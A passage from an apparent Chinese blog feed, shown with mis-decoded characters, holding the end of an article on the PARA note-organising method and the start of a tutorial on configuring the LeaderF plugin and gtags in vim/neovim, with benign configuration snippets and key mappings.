¹æ®æˆ‘ä»¬ä¹‹å‰çš„å®šä¹‰,åˆ—è¡¨ä¸Šçš„é¡¹ç›®ä¸€ä¸ªéƒ½ä¸æ˜¯ã€‚â€œæˆ˜ç•¥è§„åˆ’â€ä»€ä¹ˆæ—¶å€™ä¼šæ°¸ä¹…ç»“æŸ?ä»€ä¹ˆæ—¶å€™ä½ å¯ä»¥ä»åˆ—è¡¨ä¸Šæ°¸ä¹…åˆ é™¤â€œåº¦å‡â€?å¸Œæœ›ä¸ä¼šå§!</p><p>äº‹å®ä¸Š,è¿™ä¸ªåˆ—è¡¨ä¸Šçš„æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ªè´£ä»»é¢†åŸŸã€‚è¿™å¯èƒ½çœ‹ä¼¼è¯­ä¹‰å­¦,ä½†ç»ä¸æ˜¯ã€‚æˆ‘äº†è§£åˆ°,æ— è®ºä½ å¤šèªæ˜å¤šåŠªåŠ›,å¦‚æœä¸å°†è´£ä»»é¢†åŸŸç»†åˆ†ä¸ºå…·ä½“çš„é¡¹ç›®,æœ‰ä¸¤ä»¶å…³é”®çš„äº‹ä½ æ— æ³•åšåˆ°ã€‚</p><h3 id="1-ä½ æ— æ³•çœŸæ­£çŸ¥é“ä½ çš„æ‰¿è¯ºæœ‰å¤šå°‘"><a href="#1-ä½ æ— æ³•çœŸæ­£çŸ¥é“ä½ çš„æ‰¿è¯ºæœ‰å¤šå°‘" class="headerlink" title="1. ä½ æ— æ³•çœŸæ­£çŸ¥é“ä½ çš„æ‰¿è¯ºæœ‰å¤šå°‘"></a>1. ä½ æ— æ³•çœŸæ­£çŸ¥é“ä½ çš„æ‰¿è¯ºæœ‰å¤šå°‘</h3><p>æˆ‘ç»å¸¸å¬åˆ°çš„ä¸€ä¸ªæœ€å¸¸è§çš„æŠ±æ€¨æ˜¯äººä»¬â€œæ²¡æœ‰å¸¦å®½â€ã€‚æˆ‘èƒ½ç†è§£â€”â€”å¤§éƒ¨åˆ†æ—¶é—´ä½ è§‰å¾—è‡ªå·±çš„ä»»åŠ¡è¿‡å¤šå¯¹ä¸å¯¹?</p><p>ä½†æ˜¯åªè¦ä½ ç»§ç»­ä»¥é¢†åŸŸçš„è§†è§’çœ‹å¾…å·¥ä½œ,ä½ å°±æ°¸è¿œä¸ä¼šå¾ˆæ¸…æ¥šä½ çš„ä»»åŠ¡æœ‰å¤šå°‘ã€‚çœ‹ä¸Šé¢çš„åˆ—è¡¨,â€œæ‹›è˜â€ä»£è¡¨çš„å·¥ä½œé‡æœ‰å¤šå¤§å‘¢?å¯èƒ½æ˜¯æ¯6ä¸ªæœˆå…¼èŒæ‹›è˜ä¸€æ¬¡,ä¹Ÿå¯èƒ½æ˜¯è¿™ä¸ªå­£åº¦æ‹›è˜50ä¸ªèŒä½ã€‚</p><p>å…‰çœ‹ä¸€çœ¼æ ¹æœ¬æ— æ³•çŸ¥é“,è¿™ç§ä¸ç¡®å®šæ€§ä¼šè¡¨ç°ä¸ºæ¯ä¸ªé¢†åŸŸæ„Ÿè§‰éƒ½æ¯”å®é™…æ›´ç¹é‡ã€‚</p><p>æƒ³è±¡ä¸€ä¸‹,å¦‚æœä½ ç¡®å®šæ‹›è˜ä¸­çš„æ¯ä¸ªé¡¹ç›®,å¹¶æ¯å¤©å°†è¿™ä¸ªåˆ—è¡¨æ”¾åœ¨é¢å‰ã€‚åˆ¤æ–­è¿˜å‰©ä¸‹å¤šå°‘å·¥ä½œè¦åš,ä»¥åŠæ¥ä¸‹æ¥åº”è¯¥åšä»€ä¹ˆ,ä¸æ˜¯ä¼šå®¹æ˜“å¾ˆå¤šå—?ä¾‹å¦‚:</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/para4.png" alt="para4"></p><h3 id="2-ä½ æ— æ³•å°†å½“å‰çš„åŠªåŠ›è¿æ¥åˆ°é•¿æœŸç›®æ ‡"><a href="#2-ä½ æ— æ³•å°†å½“å‰çš„åŠªåŠ›è¿æ¥åˆ°é•¿æœŸç›®æ ‡" class="headerlink" title="2. ä½ æ— æ³•å°†å½“å‰çš„åŠªåŠ›è¿æ¥åˆ°é•¿æœŸç›®æ ‡"></a>2. ä½ æ— æ³•å°†å½“å‰çš„åŠªåŠ›è¿æ¥åˆ°é•¿æœŸç›®æ ‡</h3><p>çŸ¥è¯†å‹å·¥ä½œæœ€å…·æŒ‘æˆ˜æ€§(ä¹Ÿæœ€ä»¤äººæ»¡è¶³)çš„ä¸€ä¸ªæ–¹é¢æ˜¯å®ƒéœ€è¦æˆ‘ä»¬çš„åˆ›é€ åŠ›ã€‚è€Œåˆ›é€ åŠ›è‹¥æ²¡æœ‰åŠ¨åŠ›æ„Ÿå¾ˆéš¾æŒç»­ã€‚å¦‚æœèº«å¿ƒè€—å°½å’Œå£«æ°”ä½è½,ä½ å°±æ— æ³•ç»§ç»­åšå‡ºæœ€å¥½çš„æ€è€ƒå’Œè´¡çŒ®æœ€å¥½çš„æƒ³æ³•ã€‚</p><p><strong>æˆ‘ä»¬çš„åŠ¨åŠ›å–å†³äºä»€ä¹ˆ?ä¸»è¦æ˜¯æŒç»­çš„è¿›æ­¥ã€‚</strong>å¦‚æœçŸ¥é“æ­£åœ¨æœç€æŸä¸ªæ–¹å‘å‰è¿›,æˆ‘ä»¬å¯ä»¥åœ¨çŸ­æœŸå†…å¿å—ç›¸å½“å¤§çš„å‹åŠ›å’ŒæŒ«æŠ˜ã€‚</p><p>è¿™å°±å¸¦æˆ‘ä»¬åˆ°äº†ç¬¬äºŒä¸ªé—®é¢˜:æ²¡æœ‰å„ä¸ªé¡¹ç›®çš„åˆ—è¡¨,ä½ æ— æ³•å°†å½“å‰çš„åŠªåŠ›è¿æ¥åˆ°é•¿æœŸç›®æ ‡ã€‚</p><p>å†çœ‹çœ‹ä¸Šé¢çš„åˆ—è¡¨ã€‚å…¶ä¸­çš„é¡¹ç›®éƒ½ä¸ä¼šç»“æŸæˆ–æ”¹å˜â€”â€”è¿™æ˜¯è´£ä»»é¢†åŸŸçš„å®šä¹‰,å®ƒä¼šæ— é™æœŸåœ°æŒç»­ã€‚ç°åœ¨æƒ³è±¡ä¸€å‘¨åˆä¸€å‘¨,ä¸€ä¸ªæœˆåˆä¸€ä¸ªæœˆ,ç”šè‡³ä¸€å¹´åˆä¸€å¹´é†’æ¥é¢å¯¹å®Œå…¨ç›¸åŒçš„æ°¸æ— æ­¢å¢ƒçš„è´£ä»»åˆ—è¡¨ã€‚æ— è®ºä½ å·¥ä½œå¤šåŠªåŠ›,é‚£æ— è¾¹çš„åœ°å¹³çº¿ä¼¼ä¹æ°¸è¿œä¸ä¼šæ›´è¿‘ã€‚</p><p>è€å®è¯´,å¦‚æœæˆ‘æƒ³è®¾è®¡ä¸€ä¸ªæ›´å¥½çš„æ–¹å¼æ¥æ‰¼æ€ä½ çš„åŠ¨åŠ›,æˆ‘éƒ½æƒ³ä¸å‡ºæ¥ã€‚</p><p>å½“ä½ å°†è´£ä»»åˆ†è§£æˆå®¹æ˜“ç®¡ç†çš„é¡¹ç›®æ—¶,ä½ å¯ä»¥ç¡®ä¿é¡¹ç›®åˆ—è¡¨ä¼šä¸æ–­æ›´æ–°ã€‚æ¯å½“æˆåŠŸå®Œæˆä¸€ä¸ªé¡¹ç›®å°±ä¼šæœ‰å®šæœŸçš„æˆå°±æ„Ÿã€‚æƒ³è±¡ä¸€ä¸‹,é€šè¿‡å°†å¹¿æ³›çš„â€œæ´»åŠ¨â€é¢†åŸŸç»†åˆ†æˆä½ æ­£åœ¨ä¸¾åŠçš„æ¯ä¸ªæ´»åŠ¨,ä¼šæœ‰å¤šå¤§çš„åŠ¨åŠ›å’Œæˆå°±æ„Ÿ:</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/para5.png" alt="para5"></p><p><strong>æ— è®ºä½ çš„è´£ä»»æœ‰å¤šå¹¿æ³›,ä½ æ€»èƒ½å°†å®ƒä»¬ç»†åˆ†ä¸ºæ›´å°çš„é¡¹ç›®ã€‚è€Œä½ å¿…é¡»è¿™æ ·åš,å¦‚æœä½ æƒ³çŸ¥é“è‡ªå·±æ˜¯å¦çœŸæ­£åœ¨æœç›®æ ‡è¿ˆè¿›ã€‚</strong></p><h2 id="ä¸ºä½ æƒ³è¦çš„ç”Ÿæ´»æ–¹å¼ç»„ç»‡ä¿¡æ¯"><a href="#ä¸ºä½ æƒ³è¦çš„ç”Ÿæ´»æ–¹å¼ç»„ç»‡ä¿¡æ¯" class="headerlink" title="ä¸ºä½ æƒ³è¦çš„ç”Ÿæ´»æ–¹å¼ç»„ç»‡ä¿¡æ¯"></a>ä¸ºä½ æƒ³è¦çš„ç”Ÿæ´»æ–¹å¼ç»„ç»‡ä¿¡æ¯</h2><p>ä½¿ç”¨PARAä¸ä»…ä»…æ˜¯åˆ›å»ºä¸€å †æ–‡ä»¶å¤¹æ¥æ”¾ä¸œè¥¿ã€‚</p><p>å®ƒæ˜¯å…³äºç¡®å®šä½ çš„å·¥ä½œå’Œç”Ÿæ´»çš„ç»“æ„â€”â€”ä½ è´Ÿè´£äº†ä»€ä¹ˆ,ä½ æƒ³æ”¹å˜ä»€ä¹ˆ,ä½ æƒ³å»å“ªé‡Œã€‚å®ƒæ˜¯ä»¥ä¸€ç§æ”¯æŒå’Œæ„å»ºä½ æƒ³è¦çš„æœªæ¥ç”Ÿæ´»çš„æ–¹å¼æ¥ç»„ç»‡ä¿¡æ¯ã€‚</p><p>æˆ‘ä»¬æ‰€è¯´çš„â€œç»„ç»‡â€ä¸­çš„å¾ˆå¤šæœ¬è´¨ä¸Šæ˜¯ä¼ªè£…çš„æ‹–å»¶ã€‚æˆ‘ä»¬å‘Šè¯‰è‡ªå·±æˆ‘ä»¬åœ¨â€œåšå‡†å¤‡â€æˆ–â€œè¿›è¡Œç ”ç©¶â€,å‡è£…è¿™æ˜¯è¿›æ­¥ã€‚ä½†å®é™…ä¸Š,æˆ‘ä»¬åœ¨å¯»æ‰¾ä»»ä½•å°äº‹æ¥æ‰“ç£¨æˆ–æ•´ç†,ä»¥é¿å…é¢å¯¹æˆ‘ä»¬æ‰€æ†æ¶çš„ä»»åŠ¡ã€‚</p><p>PARAçœ‹ç©¿äº†è¿™å±‚å¤–å£³,ç»™äº†æˆ‘ä»¬ä¸€ç§ç»„ç»‡ä»»ä½•ä¸œè¥¿çš„æ–¹æ³•,å®ƒéå¸¸ç®€å•åˆ°æ²¡æœ‰ä»»ä½•å€Ÿå£,é™¤äº†ä¸‹ä¸€æ­¥å¿…è¦çš„è¡ŒåŠ¨ä¹‹å¤–å†æ— å…¶ä»–ã€‚è¿™æ˜¯ä¸€ç§æç®€çš„æ–¹å¼,åªæ·»åŠ åˆ°ä½ çš„ç¯å¢ƒä¸­åˆšåˆšè¶³å¤Ÿçš„é¡ºåº,ä½¿ä½ æœ‰æ¸…æ™°åº¦æ¥å‰è¿›,æ²¡æœ‰æ›´å¤šã€‚</p><p>å¤–é¢è¿˜æœ‰å…¶ä»–æ›´å¤æ‚ã€æ›´ç²¾ç»†å’Œæ›´ä¸“ä¸šçš„ç»„ç»‡ä¿¡æ¯çš„æ–¹å¼,ä½†PARAæ˜¯å”¯ä¸€ç»å¾—èµ·æ—¶é—´è€ƒéªŒçš„,å› ä¸ºå®ƒç»™ä½ çš„æ—¶é—´æ¯”å®ƒå ç”¨çš„æ—¶é—´æ›´å¤šã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨ vim ä¸­ä½¿ç”¨ LeaderF å’Œ gtags</title>
    <link href="/cn/vim_gtags_leaderf/"/>
    <url>/cn/vim_gtags_leaderf/</url>
    
    <content type="html"><![CDATA[<h2 id="â˜†-ç¼˜ç”±å’Œä¸€äº›-vim-å†å²"><a href="#â˜†-ç¼˜ç”±å’Œä¸€äº›-vim-å†å²" class="headerlink" title="â˜† ç¼˜ç”±å’Œä¸€äº› vim å†å²"></a>â˜† ç¼˜ç”±å’Œä¸€äº› vim å†å²</h2><p>å‰äº›å¹´ vim æ²¡æœ‰å­çª—å£çš„æ¦‚å¿µï¼Œæ—¥æœ¬çš„ä¸€ä¸ª vim æ’ä»¶ä½œè€…ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ç”Ÿæ’¸äº†ä¸€å¥—æµç¨‹ï¼Œå½“æ—¶ unite.vim æ¨ªç©ºå‡ºä¸–æƒŠè‰³äº†æˆ‘ä¸€æŠŠã€‚åé¢éšç€æŠ€æœ¯å‘å±•ï¼Œneovim å’Œ vim å…ˆåå¼•å…¥äº† floating window ï¼Œè¿™æ‰ä½¿å¾—æƒ…å†µå˜å¾—å¥½äº†ä¸€ç‚¹ã€‚</p><p><a href="https://github.com/vim/vim/blob/master/runtime/doc/popup.txt">https://github.com/vim/vim/blob/master/runtime/doc/popup.txt</a><br><a href="https://neovim.io/doc/user/api.html#api-floatwin">https://neovim.io/doc/user/api.html#api-floatwin</a></p><p>å¾—ç›Šäºæ–°æŠ€æœ¯ï¼Œåœ¨ vim ä¸­ä½¿ç”¨ LeaderF æ’ä»¶çš„äº¤äº’ä½“éªŒä¸Šäº†ä¸€ä¸ªå°é˜¶ã€‚</p><p><img src="https://raw.githubusercontent.com/Yggdroot/Images/master/leaderf/leaderf_popup.gif" alt="Demo"></p><p>neovim ä» 0.9 ç‰ˆæœ¬å¼€å§‹æ”¾å¼ƒå¯¹ cscope çš„æ”¯æŒ <a href="https://twitter.com/Neovim/status/1580933880579641344">https://twitter.com/Neovim/status/1580933880579641344</a></p><p>è¿™ç»™æˆ‘é˜…è¯»æºç é€ æˆäº†ä¸€äº›é—®é¢˜ï¼Œè™½ç„¶ vim ä»ç„¶å¯ä»¥ä½¿ç”¨ cscopeï¼Œä½† vim çš„å¯åŠ¨é€Ÿåº¦ä¸å¦‚ nvim å¿«ï¼Œæ‰€ä»¥æˆ‘å¼€å§‹å¯»æ‰¾æ›¿ä»£æ–¹æ¡ˆã€‚åŒæ—¶ï¼Œæˆ‘å‘ç° denite.nvimï¼Œunite.vimï¼Œä½œè€…ä¹Ÿä¸æ€ä¹ˆç»´æŠ¤äº†ï¼Œä¸€æƒ³ä¼¼ä¹æ˜¯å¾ˆå¤šå¹´æ²¡æœ‰ç»´æŠ¤ vim é…ç½®äº†ã€‚</p><p>åœ¨ç½‘ç»œä¸Šæœç´¢åœ¨ neovim ä¸Šé˜…è¯»æºç çš„æ–¹æ³•ï¼Œæ— æ„å‘ç°æœ‰äººæåˆ°ç”¨ LeaderF æ›¿ä»£ tagbarï¼Œäºæ˜¯æœ‰äº†ç°åœ¨çš„è¿™ç¯‡æ–‡ç« ã€‚</p><h2 id="â˜†-å®‰è£…vim-æ’ä»¶-LeaderF"><a href="#â˜†-å®‰è£…vim-æ’ä»¶-LeaderF" class="headerlink" title="â˜† å®‰è£…vim æ’ä»¶ LeaderF"></a>â˜† å®‰è£…vim æ’ä»¶ LeaderF</h2><p>æ’ä»¶çš„ä»“åº“åœ°å€ï¼š<a href="https://github.com/Yggdroot/LeaderF/tree/master">https://github.com/Yggdroot/LeaderF/tree/master</a></p><p>ä½¿ç”¨ <a href="https://github.com/VundleVim/Vundle.vim">Vundle.vim</a> å®‰è£…ï¼Œåœ¨ .vimrc ä¸­æ·»åŠ ä¸‹é¢ä¸€è¡Œ</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Plug &#x27;Yggdroot/LeaderF&#x27;, &#123; &#x27;do&#x27;: &#x27;:LeaderfInstallCExtension&#x27; &#125;<br></code></pre></td></tr></table></figure><p>åœ¨ vim ä¸­æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œå³å¯æˆåŠŸå®‰è£…ï¼Œå¦‚æœé‡åˆ°ç½‘ç»œé—®é¢˜ï¼Œè‡ªå·±æŒ‚ä¸Šçº¿è·¯å³å¯ã€‚</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">ï¼šso %<br><span class="hljs-symbol">:PlugInstall</span><br></code></pre></td></tr></table></figure><h2 id="â˜†-LeaderF-é…ç½®"><a href="#â˜†-LeaderF-é…ç½®" class="headerlink" title="â˜† LeaderF é…ç½®"></a>â˜† LeaderF é…ç½®</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">let g:Lf_WorkingDirectoryMode = <span class="hljs-string">&#x27;Ac&#x27;</span><br>let g:Lf_RootMarkers = [<span class="hljs-string">&#x27;.git&#x27;</span>, <span class="hljs-string">&#x27;.svn&#x27;</span>, <span class="hljs-string">&#x27;.hg&#x27;</span>, <span class="hljs-string">&#x27;.project&#x27;</span>, <span class="hljs-string">&#x27;.root&#x27;</span>]<br>let g:Lf_DefaultExternalTool=<span class="hljs-string">&#x27;rg&#x27;</span><br>let g:Lf_WindowPosition = <span class="hljs-string">&#x27;popup&#x27;</span><br><br>let g:Lf_UseCache = <span class="hljs-number">0</span><br>let g:Lf_PreviewInPopup = <span class="hljs-number">1</span><br>let g:Lf_ShowHidden = <span class="hljs-number">1</span>  <span class="hljs-string">&quot;show hidden files</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span> preview or not<br>let g:Lf_PreviewResult = &#123;<span class="hljs-string">&#x27;Function&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;BufTag&#x27;</span>: <span class="hljs-number">0</span> &#125;<br></code></pre></td></tr></table></figure><ul><li>g:Lf_WorkingDirectoryMode &#x3D; â€˜AFâ€™ è®¾ç½®å·¥ä½œç›®å½•ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ° RootMarker ä»¥å½“å‰æ–‡ä»¶æ‰€åœ¨ç›®å½•ä½œä¸ºå·¥ä½œç›®å½•</li></ul><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">g:Lf_WorkingDirectoryMode                       *g:Lf_WorkingDirectoryMode*<br>    This option customizes LeaderF<span class="hljs-symbol">&#x27;s</span> working directory.<br>    e.g., &gt;<br>    let g:Lf_WorkingDirectoryMode = <span class="hljs-symbol">&#x27;Ac</span>&#x27;<br>&lt;<br>    c - the directory <span class="hljs-keyword">of</span> the current working directory.(<span class="hljs-keyword">default</span>)<br>    a - the nearest ancestor <span class="hljs-keyword">of</span> current working directory that contains one <span class="hljs-keyword">of</span><br>        directories <span class="hljs-keyword">or</span> files defined <span class="hljs-keyword">in</span> |g:Lf_RootMarkers|. Fall back <span class="hljs-keyword">to</span> <span class="hljs-symbol">&#x27;c</span>&#x27; <span class="hljs-keyword">if</span><br>        no such ancestor directory found.<br>    A - the nearest ancestor <span class="hljs-keyword">of</span> current <span class="hljs-keyword">file</span> that contains one <span class="hljs-keyword">of</span> directories<br>        <span class="hljs-keyword">or</span> files defined <span class="hljs-keyword">in</span> |g:Lf_RootMarkers|. Fall back <span class="hljs-keyword">to</span> <span class="hljs-symbol">&#x27;c</span>&#x27; <span class="hljs-keyword">if</span> no such<br>        ancestor directory found.<br>    f - the directory <span class="hljs-keyword">of</span> the current <span class="hljs-keyword">file</span>.<br>    F - <span class="hljs-keyword">if</span> the current working directory <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> the direct ancestor <span class="hljs-keyword">of</span> current<br>        <span class="hljs-keyword">file</span>, <span class="hljs-keyword">use</span> the directory <span class="hljs-keyword">of</span> the current <span class="hljs-keyword">file</span> as LeaderF<span class="hljs-symbol">&#x27;s</span> working<br>        directory, otherwise, same as <span class="hljs-symbol">&#x27;c</span>&#x27;.<br>    <span class="hljs-literal">Note</span>: <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;F&quot;</span> <span class="hljs-keyword">is</span> included <span class="hljs-keyword">with</span> <span class="hljs-string">&quot;a&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-keyword">use</span> the behavior <span class="hljs-keyword">of</span> <span class="hljs-string">&quot;f&quot;</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-string">&quot;F&quot;</span>(as a fallback) <span class="hljs-keyword">when</span> a root can<span class="hljs-symbol">&#x27;t</span> be found.<br><br></code></pre></td></tr></table></figure><ul><li>g:Lf_DefaultExternalTool  ç´¢å¼•æ–‡ä»¶ä½¿ç”¨çš„å¤–éƒ¨å·¥å…·ï¼Œå¯é€‰å€¼ä¸º â€˜rgâ€™, â€˜ptâ€™, â€˜agâ€™, â€˜findâ€™ï¼Œä½œè€…æ¨èä½¿ç”¨ <a href="https://github.com/BurntSushi/ripgrep">rg</a></li><li>g:Lf_UseCache åˆ—æ–‡ä»¶æ—¶æ˜¯å¦ä½¿ç”¨ç¼“å­˜ï¼Œé»˜è®¤å€¼ä¸º 1ï¼Œè®¾ç½®ä¸º 0 ä¸ä½¿ç”¨ç¼“å­˜</li><li>g:Lf_WindowPositionï¼ŒLeaderF çª—å£çš„ä½ç½®ï¼Œå¯é€‰å€¼æœ‰ top, bottom, left, right, popup,fullscreenï¼Œé»˜è®¤å€¼ä¸º bottom</li><li>g:Lf_PreviewInPopup è®¾ç½®æ˜¯å¦åœ¨ LeaderF çš„ popup çª—å£æ˜¾ç¤ºé¢„è§ˆ, é»˜è®¤å€¼ä¸º 0</li><li>g:Lf_ShowHidden æ˜¯å¦æ˜¾ç¤ºéšè—æ–‡ä»¶å’Œç›®å½•ï¼Œé»˜è®¤å€¼ä¸º 0 ä¸æ˜¾ç¤ºéšè—æ–‡ä»¶</li><li>g:Lf_PreviewResult è®¾ç½®éœ€è¦æ˜¾ç¤ºé¢„è§ˆçš„å†…å®¹ï¼Œé»˜è®¤å€¼ä¸ºå…¨ 1<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> <span class="hljs-variable">g:Lf_PreviewResult</span> = &#123;<br>        \ <span class="hljs-string">&#x27;File&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Buffer&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Mru&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Tag&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;BufTag&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Function&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Line&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Colorscheme&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Rg&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Gtags&#x27;</span>: <span class="hljs-number">1</span><br>        \&#125;<br></code></pre></td></tr></table></figure></li></ul><p>é…ç½®å¥½äº† LeaderFï¼Œåœ¨ vim&#x2F;neovim çš„å‘½ä»¤è¡Œè¾“å…¥  <code>:Leaderf</code>  tab å°±å¯ä»¥çœ‹åˆ°ç›¸å…³çš„å‘½ä»¤äº†ï¼Œå¦‚æœå¿˜è®°äº†å…·ä½“çš„å‘½ä»¤ä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œä½¿ç”¨ <code>LeaderfSelf</code> å³å¯åˆ—å‡ºæ‰€æœ‰çš„ Leaderf å‘½ä»¤ã€‚å¦‚ä½•æƒ³æŸ¥çœ‹å…·ä½“å‘½ä»¤çš„ä½¿ç”¨æ–¹æ³•ï¼Œåœ¨å‘½ä»¤çª—å£è¾“å…¥ <code>:Leaderf -h</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vim">subcommands:<br><br>  &#123;<span class="hljs-keyword">file</span>,<span class="hljs-keyword">tag</span>,<span class="hljs-keyword">function</span>,mru,searchHistory,cmdHistory,<span class="hljs-keyword">help</span>,<span class="hljs-built_in">line</span>,<span class="hljs-keyword">colorscheme</span>,gtags,<br>      self,bufTag,<span class="hljs-keyword">buffer</span>,rg,<span class="hljs-keyword">filetype</span>,<span class="hljs-keyword">command</span>,window,quickfix,loclist,<span class="hljs-keyword">jumps</span>&#125;<br>    <span class="hljs-keyword">file</span>                <span class="hljs-built_in">search</span> <span class="hljs-keyword">files</span><br>    <span class="hljs-keyword">tag</span>                 navigate <span class="hljs-keyword">tags</span> using the <span class="hljs-keyword">tags</span> <span class="hljs-keyword">file</span><br>    <span class="hljs-keyword">function</span>            <span class="hljs-title">navigate</span> functions or methods in the buffer<br>    mru                 <span class="hljs-built_in">search</span> most recently used <span class="hljs-keyword">files</span><br>    searchHistory       <span class="hljs-keyword">execute</span> the <span class="hljs-built_in">search</span> <span class="hljs-keyword">command</span> in the <span class="hljs-keyword">history</span><br>    cmdHistory          <span class="hljs-keyword">execute</span> the <span class="hljs-keyword">command</span> in the <span class="hljs-keyword">history</span><br>    <span class="hljs-keyword">help</span>                navigate the <span class="hljs-keyword">help</span> <span class="hljs-keyword">tags</span><br>    <span class="hljs-built_in">line</span>                <span class="hljs-built_in">search</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">line</span> in the <span class="hljs-keyword">buffer</span><br>    <span class="hljs-keyword">colorscheme</span>         switch between colorschemes<br>    gtags               navigate <span class="hljs-keyword">tags</span> using the gtags<br>    self                <span class="hljs-keyword">execute</span> the commands of itself<br>    bufTag              navigate <span class="hljs-keyword">tags</span> in the <span class="hljs-keyword">buffer</span><br>    <span class="hljs-keyword">buffer</span>              <span class="hljs-built_in">search</span> <span class="hljs-keyword">buffers</span><br>    rg                  <span class="hljs-keyword">grep</span> using rg<br>    <span class="hljs-keyword">filetype</span>            navigate the <span class="hljs-keyword">filetype</span><br>    <span class="hljs-keyword">command</span>             <span class="hljs-keyword">execute</span> built-in/user-defined Ex commands.<br>    window              <span class="hljs-built_in">search</span> windows.<br>    quickfix            navigate the quickfix.<br>    loclist             navigate the location <span class="hljs-keyword">list</span>.<br></code></pre></td></tr></table></figure><p>å¥½äº†ï¼Œæˆ‘å¯ä»¥æ”¾å¼ƒ fzf.vim, ctrp.vim, tagbar, unite.vim, denite.vim ç­‰ä¸€ç³»åˆ— vim æ’ä»¶äº†ã€‚ åœ¨æ—¥å¸¸ä½¿ç”¨ä¸­ï¼Œæ¯æ¬¡éƒ½è¾“å…¥é‚£ä¹ˆé•¿çš„å‘½ä»¤ä¸å¤ªæ–¹ä¾¿ï¼Œæˆ‘ä»¬å¯ä»¥é…ç½®ä»¥ä¸‹å®¹æ˜“è®°å¿†çš„å¿«æ·é”®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">noremap &lt;leader&gt;fs :LeaderfSelf&lt;cr&gt;<br>noremap &lt;leader&gt;fm :LeaderfMru&lt;cr&gt;<br>noremap &lt;leader&gt;ff :LeaderfFunction&lt;cr&gt;<br>noremap &lt;leader&gt;fb :LeaderfBuffer&lt;cr&gt;<br>noremap &lt;leader&gt;ft :LeaderfBufTag&lt;cr&gt;<br>noremap &lt;leader&gt;fl :LeaderfLine&lt;cr&gt;<br>noremap &lt;leader&gt;fw :LeaderfWindow&lt;cr&gt;<br></code></pre></td></tr></table></figure><p>å€¼å¾—ä¸€æçš„æ˜¯ rg å‘½ä»¤ï¼Œå¯ä»¥ç›´æ¥åœ¨ç›®å½•æ–‡ä»¶å†…æœç´¢å­—ç¬¦ä¸²ï¼Œripgrep çš„æ­£åˆ™è¡¨è¾¾å¼æ¯” vim çš„æ­£åˆ™è¦æ­£å¸¸å¤šäº†ã€‚vim çš„æ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æ³•å¯ä»¥å‚è§ï¼š<a href="https://vimdoc.sourceforge.net/htmldoc/pattern.html">https://vimdoc.sourceforge.net/htmldoc/pattern.html</a><br>ä»¥å‰æˆ‘ä¸ºäº†è§„é¿ vim 